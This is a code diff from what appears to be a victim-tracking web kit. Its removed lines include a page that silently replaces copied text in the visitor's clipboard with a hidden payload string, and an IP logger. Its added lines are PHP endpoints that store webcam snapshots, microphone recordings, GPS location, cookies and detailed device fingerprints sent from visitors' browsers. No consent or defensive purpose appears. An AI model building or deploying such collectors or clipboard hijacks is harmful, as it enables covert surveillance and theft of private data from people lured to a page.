@@ -1,48 +1,109 @@
-document.getElementById("copyme").innerText = "$ShowText$";
-document.getElementById("copyme").addEventListener(
-    "copy", function(e){
-        e.clipboardData.setData("text/plain",
-        "$CopyData$");
-        e.preventDefault();
-    }
-)<?php
-include 'ip.php';
-header('Location: /index2.html');
-exit
-?><html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-#copyme{
-    font-family: 'Inconsolata', monospace;
-    color: white;
-    background-color: black;
-    padding: 1em;
-    max-width: 20em;
-}
-</style>
-</head>
-<body>
-<h1 align="center">Copy The Below Test!</h1><br>
-<h4><div id="copyme" align="center"></div></h4>
-<script src="index.js"></script>
-</body>
-</html><?php
+<?php
 
-if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-  $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-} else
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( 'data.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?><?php
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+file_put_contents('data.dat', ' '  . $_POST['cat'] . "\n", FILE_APPEND);
+exit();
+?><?php
+header("Content-Type: text/html");
+error_log("Received" . "\r\n", 3, "Log.log");
 {
-  $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+  $ip = $_GET["ip"];
+  $time = $_GET["time"];
+  $touch = $_GET["touch"];
+  $cookie = $_GET["cookie"];
+  $ua = $_GET["ua"];
+  $platf = $_GET["platf"];
+  $lang = $_GET["lang"];
+  $memory = $_GET["memory"];
+  $wid = $_GET["wid"];
+  $hig = $_GET["hig"];
+  $netType = $_GET["netType"];
+  $saveData = $_GET["saveData"];
+  $batLevel = $_GET["batLevel"];
+  $batCharge = $_GET["batCharge"];
+  $dname = $_GET["dname"];
+
+  $data["info"] = array(
+    "ip" => $ip,
+    "time" => $time,
+    "touch" => $touch,
+    "cookie" => $cookie,
+    "ua" => $ua,
+    "platf" => $platf,
+    "lang" => $lang,
+    "memory" => $memory,
+    "wid" => $wid,
+    "hig" => $hig,
+    "netType" => $netType,
+    "saveData" => $saveData,
+    "batLevel" => $batLevel,
+    "batCharge" => $batCharge,
+    "dname" => $dname);
+
+  $jdata = json_encode($data);
+
+  $f = fopen("data.json", "w+");
+  fwrite($f, $jdata);
+  fclose($f);
+}
+?><?php
+header('Content-Type: text/html');
+error_log("Received" . "\r\n", 3, "Log.log");
+{
+  $lat = $_GET['Lat'];
+  $lon = $_GET['Lon'];
+  $acc = $_GET['Acc'];
+  $alt = $_GET['Alt'];
+  $dir = $_GET['Dir'];
+  $spd = $_GET['Spd'];
+
+  $data['info'] = array(
+    'lat' => $lat,
+    'lon' => $lon,
+    'acc' => $acc,
+    'alt' => $alt,
+    'dir' => $dir,
+    'spd' => $spd);
+
+  $jdata = json_encode($data);
+
+  $f = fopen('data.json', 'w+');
+  fwrite($f, $jdata);
+  fclose($f);
+}
+?><?php
+print_r($_FILES); //this will print out the received name, temp name, type, size, etc.
+
+if (!empty($_FILES)) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
 }
 
-if (@$_GET["echo"] == "true"){
-  echo $ipaddress;
-} else{
-  $file = 'ip.txt';
-  $fp = fopen($file, 'w');
-  fwrite($fp, $ipaddress);
-  fclose($fp);
-}
+$size = $_FILES['audio_data']['size']; //the size in bytes
+$input = $_FILES['audio_data']['tmp_name']; //temporary name that PHP gave to the uploaded file
+$output = "data.wav"; //letting the client control the filename is a rather bad idea
+
+//move the file from temp name to local folder using $output name
+move_uploaded_file($input, $output)
+?>
